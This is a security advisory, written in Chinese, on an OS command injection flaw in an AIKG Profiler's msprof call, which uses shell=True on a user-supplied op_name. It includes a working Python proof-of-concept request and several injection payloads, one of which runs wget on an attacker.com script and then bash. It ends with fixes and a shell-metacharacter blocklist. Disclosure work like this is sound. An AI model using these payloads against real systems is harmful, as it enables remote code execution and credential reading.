# SA-004: Command Injection via shell=True in msprof Execution

## 漏洞概述

**漏洞类型**: 命令注入 (Command Injection)  
**CWE**: CWE-78 (OS Command Injection)  
**严重性**: Critical  
**置信度**: 85/100

AIKG Profiler 使用 `subprocess.run()` 配合 `shell=True` 执行 msprof 命令。命令字符串通过 f-string 直接拼接 `script_path` 参数，而 `script_path` 源于用户 HTTP POST 的 `op_name` Form 参数。攻击者可通过构造包含 shell 元字符的 `op_name` 注入任意命令。

---

## 源码分析

### 漏洞代码: profiler_utils.py (第140-143行)

```python
def run_msprof(script_path: str, op_name: str = "", task_id: str = "0") -> Tuple[bool, str, Optional[str]]:
    """运行msprof性能分析"""
    try:
        process = subprocess.run(
            f'msprof --application="python {script_path}"',  # ← 命令注入点
            shell=True,  # ← 危险配置
            capture_output=True, text=True, timeout=600
        )
```

**关键问题**:
1. `shell=True` 启用 shell 解释器，允许 shell 元字符（`;`, `|`, `$`, `\` 等）
2. `script_path` 直接嵌入 shell 命令字符串
3. 无输入验证或转义

### 数据流溯源: local_worker.py (第98-99行)

```python
# script_path 来源
script_name = f"verify_{op_name}.py"  # op_name 来自 HTTP POST
script_path = os.path.join(extract_dir, script_name)
```

调用链:
```
HTTP POST op_name → server.py → LocalWorker.verify() → script_name → script_path → run_msprof()
```

## 概念验证 (PoC)

```python
import requests
import tarfile
import io

def create_profile_tar():
    """创建任意 profile tar 包"""
    tar_buffer = io.BytesIO()
    with tarfile.open(fileobj=tar_buffer, mode='w') as tar:
        # 添加任意 Python 文件
        script = "print('profile')"
        script_bytes = script.encode('utf-8')
        tarinfo = tarfile.TarInfo(name="profile_test_base.py")
        tarinfo.size = len(script_bytes)
        tar.addfile(tarinfo, io.BytesIO(script_bytes))
    return tar_buffer.getvalue()

def exploit_cmd_injection_msprof(target_url="http://worker-server:9001"):
    """
    通过 op_name 参数注入命令
    op_name = "test; id > /tmp/pwned"
    → script_path 包含 shell 元字符
    → subprocess.run(shell=True) 执行注入命令
    """
    tar_data = create_profile_tar()
    
    # 构造注入 payload
    # op_name 包含 shell 元字符 ";"
    malicious_op_name = "test; id > /tmp/pwned #"  # 注入 id 命令
    
    response = requests.post(
        f"{target_url}/api/v1/profile",
        files={"package": ("profile.tar", tar_data)},
        data={
            "task_id": "cmd-inject-001",
            "op_name": malicious_op_name,
            "profile_settings": '{"backend": "ascend"}'  # 触发 msprof
        }
    )
    
    print(f"Response: {response.status_code}")
    
    # 验证注入成功
    # 检查 /tmp/pwned 文件是否存在

exploit_cmd_injection_msprof()
```

**Payload 变体**:
- `op_name = "test$(whoami)"` - 子 shell 执行
- `op_name = "test`id`"` - 命令替换
- `op_name = "test|cat /etc/passwd"` - 管道注入
- `op_name = "test && wget http://attacker.com/malware.sh && bash malware.sh"` - 链式执行

## 修复建议

### 1. 移除 shell=True（推荐）

```python
def run_msprof(script_path: str, op_name: str = "", task_id: str = "0") -> Tuple[bool, str, Optional[str]]:
    """运行msprof性能分析 - 安全版本"""
    try:
        # 使用列表参数，避免 shell 解释
        process = subprocess.run(
            ['msprof', '--application=python', script_path],
            shell=False,  # 禁用 shell
            capture_output=True, text=True, timeout=600
        )
        # ...
```

### 2. 输入验证

```python
import re

def sanitize_op_name(op_name: str) -> str:
    """验证 op_name 格式"""
    # 只允许字母、数字、下划线
    if not re.match(r'^[a-zA-Z0-9_]+$', op_name):
        raise ValueError(f"Invalid op_name: {op_name}")
    return op_name
```

### 3. 路径白名单

```python
def validate_script_path(script_path: str, extract_dir: str) -> bool:
    """验证脚本路径"""
    # 确保路径在预期目录内
    real_path = os.path.realpath(script_path)
    real_dir = os.path.realpath(extract_dir)
    if not real_path.startswith(real_dir):
        return False
    # 禁止危险字符
    if any(c in script_path for c in [';', '|', '$', '`', '&', '<', '>']):
        return False
    return True
```
